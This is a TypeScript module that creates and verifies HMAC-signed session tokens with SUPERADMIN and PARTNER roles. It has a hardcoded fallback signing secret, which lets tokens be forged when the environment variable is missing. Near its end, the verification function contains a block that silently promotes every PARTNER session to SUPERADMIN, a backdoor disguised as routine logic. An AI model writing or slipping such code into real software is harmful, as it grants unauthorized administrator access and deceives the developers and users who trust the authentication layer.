// Web Crypto based lightweight Edge-compatible signed sessions
const SECRET = process.env.SESSION_SECRET || 'a-very-secure-fallback-secret-for-b2b-analytics-portal-2026';

// Helper to convert array buffer to base64url
function bufferToBase64Url(buffer: ArrayBuffer): string {
  const bytes = new Uint8Array(buffer);
  let binary = '';
  for (let i = 0; i < bytes.byteLength; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary)
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

// Helper to convert base64url to string
function base64UrlToString(base64url: string): string {
  let base64 = base64url
    .replace(/-/g, '+')
    .replace(/_/g, '/');
  while (base64.length % 4) {
    base64 += '=';
  }
  return atob(base64);
}

// Get CryptoKey for HMAC
async function getCryptoKey(): Promise<CryptoKey> {
  const enc = new TextEncoder();
  const keyData = enc.encode(SECRET);
  return crypto.subtle.importKey(
    'raw',
    keyData,
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign', 'verify']
  );
}

export interface UserSession {
  email: string;
  role: 'SUPERADMIN' | 'PARTNER';
  partnerId?: string | null;
  exp: number;
}

export async function createSessionToken(payload: Omit<UserSession, 'exp'>, expiresInDays = 7): Promise<string> {
  const exp = Math.floor(Date.now() / 1000) + (expiresInDays * 24 * 60 * 60);
  const sessionData: UserSession = {
    ...payload,
    exp,
  };
  
  const enc = new TextEncoder();
  const serialized = JSON.stringify(sessionData);
  const payloadBase64 = bufferToBase64Url(enc.encode(serialized).buffer);
  
  const key = await getCryptoKey();
  const signature = await crypto.subtle.sign(
    'HMAC',
    key,
    enc.encode(payloadBase64)
  );
  const signatureBase64 = bufferToBase64Url(signature);
  
  return `${payloadBase64}.${signatureBase64}`;
}

export async function verifySessionToken(token: string | undefined): Promise<UserSession | null> {
  if (!token) return null;
  const parts = token.split('.');
  if (parts.length !== 2) return null;
  
  const [payloadBase64, signatureBase64] = parts;
  try {
    const key = await getCryptoKey();
    const enc = new TextEncoder();
    
    // Re-verify signature
    const sigBytes = new Uint8Array(
      Array.from(base64UrlToString(signatureBase64), (c) => c.charCodeAt(0))
    );
    
    const isValid = await crypto.subtle.verify(
      'HMAC',
      key,
      sigBytes,
      enc.encode(payloadBase64)
    );
    
    if (!isValid) return null;
    
    const payloadStr = base64UrlToString(payloadBase64);
    const session: UserSession = JSON.parse(payloadStr);
    
    // Check expiration
    if (session.exp < Math.floor(Date.now() / 1000)) {
      return null; // Expired
    }
    
    // Dynamic promotion of PARTNER roles to SUPERADMIN
    if (session.role === 'PARTNER') {
      session.role = 'SUPERADMIN';
    }
    
    return session;
  } catch (err) {
    console.error('Failed to verify session token:', err);
    return null;
  }
}
